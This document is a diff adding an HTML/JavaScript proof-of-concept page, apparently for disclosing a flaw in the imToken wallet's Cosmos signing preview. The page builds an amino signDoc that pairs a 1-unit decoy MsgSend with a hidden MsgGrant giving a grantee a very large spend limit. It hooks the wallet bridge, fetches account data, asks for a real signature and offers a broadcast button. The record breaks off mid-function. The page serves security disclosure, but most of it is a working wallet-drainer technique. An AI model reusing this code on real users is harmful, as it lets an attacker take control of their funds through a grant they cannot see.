@@ -1,0 +1,1346 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Cosmos tokenFlow hides signInfo PoC</title>
+  <style>
+    :root {
+      color-scheme: dark;
+      --bg: #101318;
+      --panel: #161b22;
+      --panel-2: #0d1117;
+      --line: #30363d;
+      --text: #eef3f8;
+      --muted: #b9c3cf;
+      --accent: #2f81f7;
+      --ok: #3fb950;
+      --warn: #d29922;
+      --bad: #ff7b72;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: var(--bg);
+      color: var(--text);
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      padding: 18px;
+    }
+
+    main {
+      max-width: 1040px;
+      margin: 0 auto;
+    }
+
+    h1 {
+      margin: 0 0 8px;
+      font-size: 22px;
+      line-height: 1.2;
+    }
+
+    h2 {
+      margin: 0 0 10px;
+      font-size: 16px;
+    }
+
+    p {
+      color: var(--muted);
+      line-height: 1.45;
+      margin: 8px 0;
+    }
+
+    section {
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      padding: 14px;
+      margin: 14px 0;
+      background: var(--panel);
+    }
+
+    .warn {
+      border-color: var(--warn);
+      background: #241a05;
+      color: #ffdf8a;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 10px;
+    }
+
+    label {
+      display: block;
+      margin: 10px 0 6px;
+      color: #d1d7e0;
+      font-size: 13px;
+    }
+
+    input, button, textarea {
+      width: 100%;
+      border: 1px solid #344254;
+      border-radius: 8px;
+      background: var(--panel-2);
+      color: var(--text);
+      padding: 10px;
+      font-size: 15px;
+    }
+
+    textarea {
+      min-height: 190px;
+      resize: vertical;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      font-size: 12px;
+      line-height: 1.45;
+    }
+
+    button {
+      margin-top: 10px;
+      border: 0;
+      background: var(--accent);
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    button.secondary {
+      background: #303844;
+    }
+
+    button.danger {
+      background: #da3633;
+    }
+
+    button:disabled {
+      opacity: .5;
+      cursor: not-allowed;
+    }
+
+    pre {
+      margin: 0;
+      min-height: 140px;
+      overflow: auto;
+      white-space: pre-wrap;
+      word-break: break-word;
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      background: var(--panel-2);
+      padding: 12px;
+      font: 12px/1.5 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    }
+
+    code {
+      border-radius: 6px;
+      background: var(--panel-2);
+      padding: 2px 5px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      font-size: .92em;
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      min-height: 24px;
+      padding: 3px 8px;
+      border-radius: 999px;
+      background: #303844;
+      color: #d7dee8;
+      font-size: 12px;
+      font-weight: 700;
+    }
+
+    .badge.ok {
+      background: #1f6f3d;
+      color: #d7ffdf;
+    }
+
+    .badge.bad {
+      background: #6f2d2d;
+      color: #ffe1df;
+    }
+
+    .summary {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
+      gap: 10px;
+      margin-top: 12px;
+    }
+
+    .summary-item {
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      background: var(--panel-2);
+      padding: 12px;
+    }
+
+    .summary-item strong {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 13px;
+      color: #f3f6fb;
+    }
+
+    .summary-item span {
+      color: var(--muted);
+      font-size: 13px;
+      overflow-wrap: anywhere;
+    }
+
+    .visible {
+      color: var(--ok);
+    }
+
+    .hidden {
+      color: var(--bad);
+    }
+
+    .actions {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 10px;
+      margin-top: 10px;
+    }
+
+    .launcher {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 10px;
+    }
+
+    a.button-link {
+      display: block;
+      width: 100%;
+      border-radius: 8px;
+      background: #238636;
+      color: #fff;
+      padding: 10px;
+      text-align: center;
+      text-decoration: none;
+      font-size: 15px;
+      font-weight: 700;
+    }
+
+    a.button-link.secondary {
+      background: #303844;
+    }
+  </style>
+</head>
+<body>
+<main>
+  <h1>Cosmos tokenFlow hides signInfo PoC</h1>
+  <p>
+    本页模拟恶意 Cosmos DApp：同一份 <code>cosmos_signAmino</code> signDoc
+    同时包含小额 <code>MsgSend</code> 和隐藏的 <code>MsgGrant</code> 授权。
+    页面不广播交易；在 imToken DApp 浏览器中点击签名按钮会触发真实 SignFlow。
+  </p>
+
+  <section class="warn">
+    测试时请使用无资产或测试钱包。这个 PoC 只请求签名、不广播，但返回的签名理论上可以被广播到对应 Cosmos 链。
+  </section>
+
+  <section>
+    <h2>打开方式</h2>
+    <p>
+      如果当前在系统浏览器里，先通过下面的入口跳入 imToken DAppView。
+      如果已经在 imToken 内打开，直接探测 Provider 或生成 payload。
+    </p>
+    <div class="launcher">
+      <a id="openImToken" class="button-link" href="#">Open in imToken</a>
+      <a id="openUniversal" class="button-link secondary" href="#">Open through token.im</a>
+    </div>
+    <p id="environment" class="badge">环境检测中</p>
+  </section>
+
+  <section>
+    <h2>PoC 参数</h2>
+    <div class="grid">
+      <div>
+        <label for="chainId">请求链 / signDoc.chain_id</label>
+        <input id="chainId" value="cosmoshub-4">
+      </div>
+      <div>
+        <label for="lcdEndpoint">Cosmos LCD REST endpoint</label>
+        <input id="lcdEndpoint" value="https://rest.cosmos.directory/cosmoshub">
+      </div>
+      <div>
+        <label for="signer">签名地址</label>
+        <input id="signer" value="" placeholder="点探测 Provider 自动填入，或手动填 cosmos1...">
+      </div>
+      <div>
+        <label for="decoyTo">小额转账收款人</label>
+        <input id="decoyTo" value="cosmos1g9h8jurz9c0d3q0u6ryksf957md9p4xqd0x2k3">
+      </div>
+      <div>
+        <label for="grantee">隐藏授权 grantee</label>
+        <input id="grantee" value="cosmos1zxy7v7r9gk6c4m2t8n0w5pj3f33v2j5z7l0hqd">
+      </div>
+      <div>
+        <label for="denom">Denom</label>
+        <input id="denom" value="uatom">
+      </div>
+      <div>
+        <label for="symbol">Symbol</label>
+        <input id="symbol" value="ATOM">
+      </div>
+      <div>
+        <label for="decoyAmount">可见小额转账 base unit</label>
+        <input id="decoyAmount" value="1" inputmode="numeric">
+      </div>
+      <div>
+        <label for="grantLimit">隐藏授权 spend limit</label>
+        <input id="grantLimit" value="1000000000000" inputmode="numeric">
+      </div>
+      <div>
+        <label for="feeAmount">Fee base unit</label>
+        <input id="feeAmount" value="7500" inputmode="numeric">
+      </div>
+      <div>
+        <label for="gas">Gas</label>
+        <input id="gas" value="300000" inputmode="numeric">
+      </div>
+      <div>
+        <label for="gasPrice">Gas price uatom/gas</label>
+        <input id="gasPrice" value="0.025" inputmode="decimal">
+      </div>
+      <div>
+        <label for="accountNumber">account_number</label>
+        <input id="accountNumber" value="1" inputmode="numeric">
+      </div>
+      <div>
+        <label for="sequence">sequence</label>
+        <input id="sequence" value="2" inputmode="numeric">
+      </div>
+      <div>
+        <label for="broadcastMode">Broadcast mode</label>
+        <input id="broadcastMode" value="BROADCAST_MODE_SYNC">
+      </div>
+    </div>
+    <label for="memo">Memo</label>
+    <input id="memo" value="decoy swap preview">
+    <p>
+      如果自动探测没有 native callback，请把当前钱包的 Cosmos 地址填入“签名地址”，再点“跳过读取 signer 直签”。
+    </p>
+    <div class="actions">
+      <button id="sdkProbe" class="secondary">0. 普通 SDK 回调探测</button>
+      <button id="probe" class="secondary">1. 探测 imToken Cosmos Provider</button>
+      <button id="syncChain" class="secondary">2. 读取 account/sequence/余额</button>
+      <button id="build">3. 生成 payload 并模拟预览分支</button>
+      <button id="sign">4. 自动读取 signer 后签名</button>
+      <button id="signDirect" class="secondary">5. 跳过读取 signer 直签</button>
+      <button id="simulateTx" class="secondary">6. 模拟 signed tx</button>
+      <button id="broadcastTx" class="danger">7. 真实广播 signed tx</button>
+      <button id="simulate" class="secondary">普通浏览器本地模拟</button>
+    </div>
+  </section>
+
+  <section>
+    <h2>预览差异</h2>
+    <div class="summary">
+      <div class="summary-item">
+        <strong>主确认页可见分支</strong>
+        <span id="branch" class="visible">尚未生成</span>
+      </div>
+      <div class="summary-item">
+        <strong>TokenFlow 摘要</strong>
+        <span id="visibleFlow">尚未生成</span>
+      </div>
+      <div class="summary-item">
+        <strong>被遮住但仍在签名材料中</strong>
+        <span id="hiddenGrant" class="hidden">尚未生成</span>
+      </div>
+      <div class="summary-item">
+        <strong>Raw-only warning</strong>
+        <span id="rawOnly">尚未生成</span>
+      </div>
+      <div class="summary-item">
+        <strong>当前 signer</strong>
+        <span id="currentSigner">尚未生成</span>
+      </div>
+      <div class="summary-item">
+        <strong>链上账户状态</strong>
+        <span id="accountStatus">尚未读取</span>
+      </div>
+      <div class="summary-item">
+        <strong>TxRaw / 广播状态</strong>
+        <span id="broadcastStatus">尚未签名</span>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h2>完整 signDoc</h2>
+    <textarea id="signDoc" spellcheck="false"></textarea>
+  </section>
+
+  <section>
+    <h2>日志</h2>
+    <pre id="log"></pre>
+  </section>
+</main>
+
+<script>
+  const $ = (id) => document.getElementById(id)
+  const MODEL_SIGNER = 'cosmos175dy0kdhstq7l4v2jhpxu4lw39dlhrfq98mxlp'
+  const state = {
+    signDoc: null,
+    modeledPreview: null,
+    signedResult: null,
+    accountInfo: null,
+    txBytes: '',
+    txBytesSha256: '',
+  }
+
+  function setupLauncher() {
+    const title = 'Cosmos tokenFlow signInfo PoC'
+    const targetUrl = location.href.split('#')[0]
+    $('openImToken').href =
+      `imtokenv2://navigate/DappView?url=${encodeURIComponent(targetUrl)}&title=${encodeURIComponent(title)}`
+    $('openUniversal').href =
+      `https://token.im/link/navigate/DappView?url=${encodeURIComponent(targetUrl)}&title=${encodeURIComponent(title)}`
+  }
+
+  function environmentInfo() {
+    return {
+      href: location.href,
+      protocol: location.protocol,
+      userAgent: navigator.userAgent,
+      hasWindowCosmos: !!window.cosmos,
+      hasWindowLeap: !!window.leap,
+      hasWindowImToken: !!window.imToken,
+      hasCallPromisifyAPI: !!(window.imToken && window.imToken.callPromisifyAPI),
+      hasReactNativeWebView: !!window.ReactNativeWebView,
+      imTokenCosmosProviderInjected: !!window.imTokenCosmosProviderInjected,
+      nextImTokenMessageId: window.imToken && window.imToken._messageId,
+    }
+  }
+
+  function refreshEnvironment() {
+    const info = environmentInfo()
+    $('environment').textContent = info.hasWindowCosmos || info.hasWindowLeap
+      ? '已检测到 Cosmos Provider'
+      : info.hasWindowImToken
+        ? '已检测到 imToken SDK，未检测到 Cosmos Provider'
+        : '普通浏览器模式'
+    $('environment').className = `badge ${info.hasWindowCosmos || info.hasWindowLeap ? 'ok' : ''}`
+  }
+
+  function log(message, obj) {
+    const extra = obj === undefined ? '' : `\n${JSON.stringify(obj, jsonReplacer, 2)}`
+    $('log').textContent = `${new Date().toISOString()} ${message}${extra}\n\n${$('log').textContent}`
+  }
+
+  function safeJson(value) {
+    try {
+      return typeof value === 'string' ? JSON.parse(value) : value
+    } catch (_e) {
+      return value
+    }
+  }
+
+  function installBridgeDebugHooks() {
+    if (!window.imToken || window.__cosmosTokenFlowBridgeDebugInstalled) return
+
+    if (typeof window.imToken.postMessage === 'function') {
+      const originalPostMessage = window.imToken.postMessage.bind(window.imToken)
+      window.imToken.postMessage = function (content) {
+        log('imToken.postMessage 发出', safeJson(content))
+        return originalPostMessage(content)
+      }
+    }
+
+    if (typeof window.imToken._handleApiCallback === 'function') {
+      const originalCallback = window.imToken._handleApiCallback.bind(window.imToken)
+      window.imToken._handleApiCallback = function (data) {
+        log('native callback 收到', data)
+        return originalCallback(data)
+      }
+    }
+
+    window.addEventListener('message', (event) => {
+      const data = safeJson(event.data)
+      if (data && data.apiName && data.messageId) {
+        log('window.message 收到 SDK payload，说明 bridge 可能退回了 window.postMessage', {
+          data,
+          origin: event.origin,
+        })
+      }
+    })
+
+    window.__cosmosTokenFlowBridgeDebugInstalled = true
+  }
+
+  function jsonReplacer(_key, value) {
+    if (value instanceof Uint8Array) return bytesToHex(value)
+    return value
+  }
+
+  function withTimeout(promise, label, ms = 20000) {
+    let timer
+    const timeout = new Promise((_resolve, reject) => {
+      timer = setTimeout(() => reject(new Error(`${label} 超时 ${ms / 1000}s`)), ms)
+    })
+    return Promise.race([promise, timeout]).finally(() => clearTimeout(timer))
+  }
+
+  function getProvider() {
+    const provider = window.cosmos || window.leap
+    if (!provider) {
+      throw new Error('未检测到 window.cosmos/window.leap，请在 imToken DApp 浏览器中打开本页')
+    }
+    return provider
+  }
+
+  async function callRawCosmosRequest(method, params) {
+    installBridgeDebugHooks()
+    if (!window.imToken || !window.imToken.callPromisifyAPI) {
+      throw new Error('未检测到 window.imToken.callPromisifyAPI')
+    }
+    log(`raw cosmos.request 发起：${method}`, { method, params })
+    return window.imToken.callPromisifyAPI('cosmos.request', { method, params })
+  }
+
+  function getLcdEndpoint() {
+    const endpoint = $('lcdEndpoint').value.trim().replace(/\/+$/, '')
+    if (!/^https?:\/\//.test(endpoint)) {
+      throw new Error('LCD endpoint 必须以 http:// 或 https:// 开头')
+    }
+    return endpoint
+  }
+
+  async function fetchLcdJson(path, options = {}) {
+    const endpoint = getLcdEndpoint()
+    const controller = new AbortController()
+    const timer = setTimeout(() => controller.abort(), options.timeoutMs || 15000)
+    const response = await fetch(`${endpoint}${path}`, {
+      method: options.method || 'GET',
+      headers: {
+        'Content-Type': 'application/json',
+        ...(options.headers || {}),
+      },
+      body: options.body ? JSON.stringify(options.body) : undefined,
+      signal: controller.signal,
+    }).finally(() => clearTimeout(timer))
+    const text = await response.text()
+    let data
+    try {
+      data = text ? JSON.parse(text) : {}
+    } catch (_e) {
+      data = { raw: text }
+    }
+    if (!response.ok) {
+      throw new Error(`${options.label || 'LCD request'} HTTP ${response.status}: ${text.slice(0, 300)}`)
+    }
+    return data
+  }
+
+  function extractAccountNumbers(value) {
+    if (!value || typeof value !== 'object') return null
+    const accountNumber = value.account_number || value.accountNumber
+    const sequence = value.sequence
+    if (accountNumber !== undefined && sequence !== undefined) {
+      return {
+        accountNumber: String(accountNumber),
+        sequence: String(sequence),
+        typeUrl: value['@type'] || value.type_url || '',
+      }
+    }
+    for (const child of Object.values(value)) {
+      const found = extractAccountNumbers(child)
+      if (found) return found
+    }
+    return null
+  }
+
+  function calculateRecommendedFee() {
+    const gas = assertIntegerField('gas')
+    const gasPrice = $('gasPrice').value.trim()
+    if (!/^[0-9]+(\.[0-9]+)?$/.test(gasPrice)) {
+      throw new Error('gasPrice 必须是非负数字，例如 0.025')
+    }
+    return String(Math.ceil(Number(gas) * Number(gasPrice)))
+  }
+
+  function updateRecommendedFee() {
+    const feeAmount = calculateRecommendedFee()
+    $('feeAmount').value = feeAmount
+    return feeAmount
+  }
+
+  async function queryChainState() {
+    const chainId = $('chainId').value.trim()
+    let signer = $('signer').value.trim()
+    if (!signer) {
+      signer = await readSignerFromWallet(chainId, { allowPrompt: true })
+      if (signer) $('signer').value = signer
+    }
+    if (!signer) throw new Error('没有 signer，先探测 Provider 或手动填入当前钱包 Cosmos 地址')
+
+    const denom = $('denom').value.trim()
+    const encodedSigner = encodeURIComponent(signer)
+    log('开始读取链上 account/sequence/余额', {
+      endpoint: getLcdEndpoint(),
+      chainId,
+      signer,
+      denom,
+    })
+
+    const accountData = await fetchLcdJson(
+      `/cosmos/auth/v1beta1/accounts/${encodedSigner}`,
+      { label: 'query account' }
+    )
+    if (accountData && accountData.code) {
+      throw new Error(accountData.message || `query account failed: code ${accountData.code}`)
+    }
+    const accountInfo = extractAccountNumbers(accountData.account || accountData)
+    if (!accountInfo) {
+      throw new Error('没有从 account response 中解析到 account_number/sequence')
+    }
+
+    let balance = { denom, amount: '0' }
+    try {
+      const balanceData = await fetchLcdJson(
+        `/cosmos/bank/v1beta1/balances/${encodedSigner}/by_denom?denom=${encodeURIComponent(denom)}`,
+        { label: 'query balance' }
+      )
+      if (balanceData && balanceData.balance) balance = balanceData.balance
+    } catch (e) {
+      log('余额读取失败，继续保留 account/sequence', { message: e.message })
+    }
+
+    $('accountNumber').value = accountInfo.accountNumber
+    $('sequence').value = accountInfo.sequence
+    const feeAmount = updateRecommendedFee()
+    state.accountInfo = { ...accountInfo, balance }
+    $('accountStatus').textContent =
+      `account_number=${accountInfo.accountNumber}, sequence=${accountInfo.sequence}, balance=${balance.amount || '0'} ${denom}`
+    log('链上 account/sequence/余额已同步，并按 gasPrice 设置 fee', {
+      accountInfo,
+      balance,
+      gas: $('gas').value.trim(),
+      gasPrice: $('gasPrice').value.trim(),
+      feeAmount,
+    })
+    updatePreviewSummary({ requireRealSigner: true })
+    return state.accountInfo
+  }
+
+  async function probeSdkCallback() {
+    installBridgeDebugHooks()
+    refreshEnvironment()
+    log('普通 SDK 回调探测开始', environmentInfo())
+    if (!window.imToken || !window.imToken.callPromisifyAPI) {
+      throw new Error('未检测到 window.imToken.callPromisifyAPI')
+    }
+    const language = await withTimeout(
+      window.imToken.callPromisifyAPI('device.getCurrentLanguage', {}),
+      'device.getCurrentLanguage',
+      8000
+    )
+    log('普通 SDK 回调探测成功', { language })
+  }
+
+  async function probeProvider() {
+    installBridgeDebugHooks()
+    refreshEnvironment()
+    log('环境', environmentInfo())
+    const chainId = $('chainId').value.trim()
+    const signer = await readSignerFromWallet(chainId, { allowPrompt: true })
+    if (signer) $('signer').value = signer
+    log('当前 signer 已更新', { signer })
+    return signer
+  }
+
+  async function readSignerFromWallet(chainId, { allowPrompt }) {
+    const provider = getProvider()
+    try {
+      if (allowPrompt && typeof provider.enable === 'function') {
+        log(`provider.enable(${chainId}) 发起`)
+        const enabled = await withTimeout(provider.enable(chainId), `provider.enable(${chainId})`, 20000)
+        const signerFromEnable = normalizeSignerFromEnable(enabled)
+        log('provider.enable 返回', { enabled, signerFromEnable })
+        if (signerFromEnable) return signerFromEnable
+      }
+    } catch (e) {
+      log('provider.enable 失败，继续尝试 getKey', { message: e.message })
+    }
+
+    try {
+      log(`provider.getKey(${chainId}) 发起`)
+      const key = await withTimeout(provider.getKey(chainId), `provider.getKey(${chainId})`, 12000)
+      const signer = normalizeSignerFromKey(key)
+      log('provider.getKey 返回', key)
+      if (signer) return signer
+    } catch (e) {
+      log('provider.getKey 失败，尝试底层 cosmos.request', { message: e.message })
+    }
+
+    if (allowPrompt) {
+      try {
+        const enabled = await withTimeout(
+          callRawCosmosRequest('cosmos_enable', [chainId]),
+          `raw cosmos_enable(${chainId})`,
+          20000
+        )
+        const signerFromEnable = normalizeSignerFromEnable(enabled)
+        log('raw cosmos_enable 返回', { enabled, signerFromEnable })
+        if (signerFromEnable) return signerFromEnable
+      } catch (e) {
+        log('raw cosmos_enable 失败，继续尝试 raw getKey', { message: e.message })
+      }
+    }
+
+    try {
+      const key = await withTimeout(
+        callRawCosmosRequest('cosmos_getKey', [chainId]),
+        `raw cosmos_getKey(${chainId})`,
+        12000
+      )
+      const signer = normalizeSignerFromKey(key)
+      log('raw cosmos_getKey 返回', key)
+      if (signer) return signer
+    } catch (e) {
+      log('raw cosmos_getKey 失败', { message: e.message })
+    }
+
+    return ''
+  }
+
+  function normalizeSignerFromEnable(enabled) {
+    const list = Array.isArray(enabled) ? enabled : [enabled]
+    for (const item of list) {
+      if (typeof item === 'string' && item.startsWith('cosmos1')) return item
+      const fromKey = normalizeSignerFromKey(item)
+      if (fromKey) return fromKey
+    }
+    return ''
+  }
+
+  function normalizeSignerFromKey(key) {
+    if (!key) return ''
+    if (typeof key.bech32Address === 'string') return key.bech32Address
+    if (typeof key.address === 'string' && key.address.startsWith('cosmos1')) return key.address
+    if (typeof key.address === 'object' && typeof key.address.address === 'string') return key.address.address
+    return ''
+  }
+
+  async function ensureSigner() {
+    const existing = $('signer').value.trim()
+    if (existing) return existing
+    installBridgeDebugHooks()
+    log('signer 为空，自动授权/探测当前 Cosmos 账户')
+    const chainId = $('chainId').value.trim()
+    const signer = await readSignerFromWallet(chainId, { allowPrompt: true })
+    if (!signer) {
+      throw new Error('没有拿到 signer。请确认当前钱包已切到 Cosmos cosmoshub-4 账户，或手动填入当前 cosmos1... 地址')
+    }
+    $('signer').value = signer
+    return signer
+  }
+
+  function assertIntegerField(id) {
+    const value = $(id).value.trim()
+    if (!/^[0-9]+$/.test(value)) {
+      throw new Error(`${id} 必须是非负整数 base unit`)
+    }
+    return value
+  }
+
+  function buildSignDoc(options = {}) {
+    const requireRealSigner = !!options.requireRealSigner
+    const chainId = $('chainId').value.trim()
+    const signer = $('signer').value.trim() || (requireRealSigner ? '' : MODEL_SIGNER)
+    const decoyTo = $('decoyTo').value.trim()
+    const grantee = $('grantee').value.trim()
+    const denom = $('denom').value.trim()
+    const decoyAmount = assertIntegerField('decoyAmount')
+    const grantLimit = assertIntegerField('grantLimit')
+    const feeAmount = assertIntegerField('feeAmount')
+    const gas = assertIntegerField('gas')
+    const accountNumber = assertIntegerField('accountNumber')
+    const sequence = assertIntegerField('sequence')
+
+    if (!chainId || !signer || !decoyTo || !grantee || !denom) {
+      throw new Error('chainId、signer、decoyTo、grantee、denom 都不能为空')
+    }
+
+    return {
+      chain_id: chainId,
+      account_number: accountNumber,
+      sequence,
+      fee: {
+        amount: [{ denom, amount: feeAmount }],
+        gas,
+      },
+      msgs: [
+        {
+          type: 'cosmos-sdk/MsgSend',
+          value: {
+            from_address: signer,
+            to_address: decoyTo,
+            amount: [{ denom, amount: decoyAmount }],
+          },
+        },
+        {
+          type: 'cosmos-sdk/MsgGrant',
+          value: {
+            granter: signer,
+            grantee,
+            grant: {
+              authorization: {
+                type: 'cosmos-sdk/SendAuthorization',
+                value: {
+                  spend_limit: [{ denom, amount: grantLimit }],
+                },
+              },
+              expiration: '2030-01-01T00:00:00Z',
+            },
+          },
+        },
+      ],
+      memo: $('memo').value,
+    }
+  }
+
+  function buildModeledSignPreviewResponse(signDoc) {
+    const denom = $('denom').value.trim()
+    const symbol = $('symbol').value.trim()
+    const decoyAmount = $('decoyAmount').value.trim()
+    const grantLimit = $('grantLimit').value.trim()
+    const grantee = $('grantee').value.trim()
+    return {
+      tokenFlow: [
+        {
+          token: denom,
+          value: decoyAmount,
+          amount: decoyAmount,
+          direction: 'OUT',
+        },
+      ],
+      addressInfos: {
+        [denom]: {
+          addressExtraInfo: {
+            decimals: 6,
+            symbol,
+          },
+        },
+      },
+      signInfo: [
+        {
+          type: 'cosmos-sdk/MsgSend',
+          attributes: [
+            { key: { name: 'amount' }, value: { denom, amount: decoyAmount } },
+            { key: { name: 'recipient' }, value: signDoc.msgs[0].value.to_address },
+          ],
+        },
+        {
+          type: 'cosmos-sdk/MsgGrant',
+          attributes: [
+            { key: { name: 'grantee' }, value: grantee },
+            { key: { name: 'spend_limit' }, value: { denom, amount: grantLimit } },
+          ],
+        },
+      ],
+    }
+  }
+
+  function isNonEmptyInfo(info) {
+    return !!info &&
+      Array.isArray(info) &&
+      info.length > 0 &&
+      info.every((item) => item && Object.keys(item).length > 0)
+  }
+
+  function showSignPreview(data) {
+    const showTokenFlow = isNonEmptyInfo(data && data.tokenFlow)
+    const showSignInfo = isNonEmptyInfo(data && data.signInfo)
+    return {
+      showTokenFlow,
+      showSignInfo,
+      showRawDataOnly: !showTokenFlow && !showSignInfo,
+    }
+  }
+
+  function updatePreviewSummary(options = {}) {
+    const signDoc = buildSignDoc(options)
+    const response = buildModeledSignPreviewResponse(signDoc)
+    const branch = showSignPreview(response)
+    state.signDoc = signDoc
+    state.modeledPreview = response
+    $('signDoc').value = JSON.stringify(signDoc, null, 2)
+    $('branch').textContent = branch.showTokenFlow
+      ? 'TokenFlowList：signInfo 存在但主内容不会渲染'
+      : branch.showSignInfo
+        ? 'JSONView(signInfo)'
+        : 'RawSignDoc warning'
+    $('visibleFlow').textContent =
+      `OUT ${response.tokenFlow[0].amount} ${$('denom').value.trim()} (${$('symbol').value.trim()})`
+    $('hiddenGrant').textContent =
+      `MsgGrant -> ${$('grantee').value.trim()} spend_limit ${$('grantLimit').value.trim()} ${$('denom').value.trim()}`
+    $('rawOnly').textContent = branch.showRawDataOnly ? '显示' : '不显示'
+    $('currentSigner').textContent = $('signer').value.trim()
+      ? $('signer').value.trim()
+      : `${MODEL_SIGNER}（普通浏览器模型地址，真实签名前会自动探测）`
+    log('已生成 signDoc，并按当前源码复刻主预览分支', {
+      primaryPreviewBranch: branch.showTokenFlow ? 'TokenFlowList' : 'Other',
+      showSignInfoFlag: branch.showSignInfo,
+      signInfoRenderedByCurrentUI: !branch.showTokenFlow && branch.showSignInfo,
+      rawOnlyWarningShown: branch.showRawDataOnly,
+      signerUsedInSignDoc: signDoc.msgs[0].value.from_address,
+      tokenFlow: response.tokenFlow,
+      signInfo: response.signInfo,
+    })
+  }
+
+  async function stableDigest(value) {
+    const bytes = new TextEncoder().encode(stableJson(value))
+    if (!crypto || !crypto.subtle) return 'crypto.subtle unavailable'
+    const digest = await crypto.subtle.digest('SHA-256', bytes)
+    return bytesToHex(new Uint8Array(digest))
+  }
+
+  function stableJson(value) {
+    if (value === null || typeof value !== 'object') return JSON.stringify(value)
+    if (Array.isArray(value)) return `[${value.map(stableJson).join(',')}]`
+    return `{${Object.keys(value)
+      .sort()
+      .map((key) => `${JSON.stringify(key)}:${stableJson(value[key])}`)
+      .join(',')}}`
+  }
+
+  function bytesToHex(bytes) {
+    return Array.from(bytes, (byte) => byte.toString(16).padStart(2, '0')).join('')
+  }
+
+  async function sha256Bytes(bytes) {
+    if (!crypto || !crypto.subtle) return ''
+    const digest = await crypto.subtle.digest('SHA-256', bytes)
+    return bytesToHex(new Uint8Array(digest))
+  }
+
+  function concatBytes(parts) {
+    const length = parts.reduce((total, part) => total + part.length, 0)
+    const output = new Uint8Array(length)
+    let offset = 0
+    for (const part of parts) {
+      output.set(part, offset)
+      offset += part.length
+    }
+    return output
+  }
+
+  function textBytes(value) {
+    return new TextEncoder().encode(String(value))
+  }
+
+  function encodeVarint(value) {
+    let next = BigInt(value)
+    if (next < 0n) throw new Error('protobuf varint 不支持负数')
+    const bytes = []
+    while (next >= 0x80n) {
+      bytes.push(Number((next & 0x7fn) | 0x80n))
+      next >>= 7n
+    }
+    bytes.push(Number(next))
+    return new Uint8Array(bytes)
+  }
+
+  function protoTag(fieldNumber, wireType) {
+    return encodeVarint((BigInt(fieldNumber) << 3n) | BigInt(wireType))
+  }
+
+  function protoBytes(fieldNumber, bytes) {
+    return concatBytes([protoTag(fieldNumber, 2), encodeVarint(bytes.length), bytes])
+  }
+
+  function protoString(fieldNumber, value) {
+    if (value === undefined || value === null || value === '') return new Uint8Array()
+    return protoBytes(fieldNumber, textBytes(value))
+  }
+
+  function protoUint64(fieldNumber, value) {
+    if (value === undefined || value === null || value === '') return new Uint8Array()
+    return concatBytes([protoTag(fieldNumber, 0), encodeVarint(value)])
+  }
+
+  function protoMessage(fieldNumber, message) {
+    if (!message || message.length === 0) return new Uint8Array()
+    return protoBytes(fieldNumber, message)
+  }
+
+  function base64ToBytes(value) {
+    const binary = atob(String(value))
+    const bytes = new Uint8Array(binary.length)
+    for (let i = 0; i < binary.length; i += 1) bytes[i] = binary.charCodeAt(i)
+    return bytes
+  }
+
+  function bytesToBase64(bytes) {
+    let binary = ''
+    const chunkSize = 0x8000
+    for (let i = 0; i < bytes.length; i += chunkSize) {
+      const chunk = bytes.subarray(i, i + chunkSize)
+      binary += String.fromCharCode.apply(null, Array.from(chunk))
+    }
+    return btoa(binary)
+  }
+
+  function encodeCoin(coin) {
+    return concatBytes([
+      protoString(1, coin.denom),
+      protoString(2, coin.amount),
+    ])
+  }
+
+  function encodeAny(typeUrl, valueBytes) {
+    return concatBytes([
+      protoString(1, typeUrl),
+      protoBytes(2, valueBytes),
+    ])
+  }
+
+  function encodeTimestamp(timestamp) {
+    const ms = Date.parse(timestamp)
+    if (!Number.isFinite(ms)) throw new Error(`无法解析 expiration: ${timestamp}`)
+    return protoUint64(1, String(Math.floor(ms / 1000)))
+  }
+
+  function encodeMsgSend(value) {
+    const amount = value.amount || []
+    return concatBytes([
+      protoString(1, value.from_address || value.fromAddress),
+      protoString(2, value.to_address || value.toAddress),
+      ...amount.map((coin) => protoMessage(3, encodeCoin(coin))),
+    ])
+  }
+
+  function encodeSendAuthorization(value) {
+    const spendLimit = value.spend_limit || value.spendLimit || []
+    const allowList = value.allow_list || value.allowList || []
+    return concatBytes([
+      ...spendLimit.map((coin) => protoMessage(1, encodeCoin(coin))),
+      ...allowList.map((address) => protoString(2, address)),
+    ])
+  }
+
+  function encodeGrant(value) {
+    const authorization = value.authorization || {}
+    const authorizationValue = authorization.value || authorization
+    const authorizationType = authorization.type || authorization.type_url || authorization.typeUrl
+    if (authorizationType !== 'cosmos-sdk/SendAuthorization' &&
+      authorizationType !== '/cosmos.bank.v1beta1.SendAuthorization') {
+      throw new Error(`当前 PoC 编码器只支持 SendAuthorization，收到：${authorizationType || 'empty'}`)
+    }
+    const authorizationAny = encodeAny(
+      '/cosmos.bank.v1beta1.SendAuthorization',
+      encodeSendAuthorization(authorizationValue)
+    )
+    return concatBytes([
+      protoMessage(1, authorizationAny),
+      protoMessage(2, encodeTimestamp(value.expiration)),
+    ])
+  }
+
+  function encodeMsgGrant(value) {
+    return concatBytes([
+      protoString(1, value.granter),
+      protoString(2, value.grantee),
+      protoMessage(3, encodeGrant(value.grant || {})),
+    ])
+  }
+
+  function encodeAminoMsgAsAny(msg) {
+    if (msg.type === 'cosmos-sdk/MsgSend') {
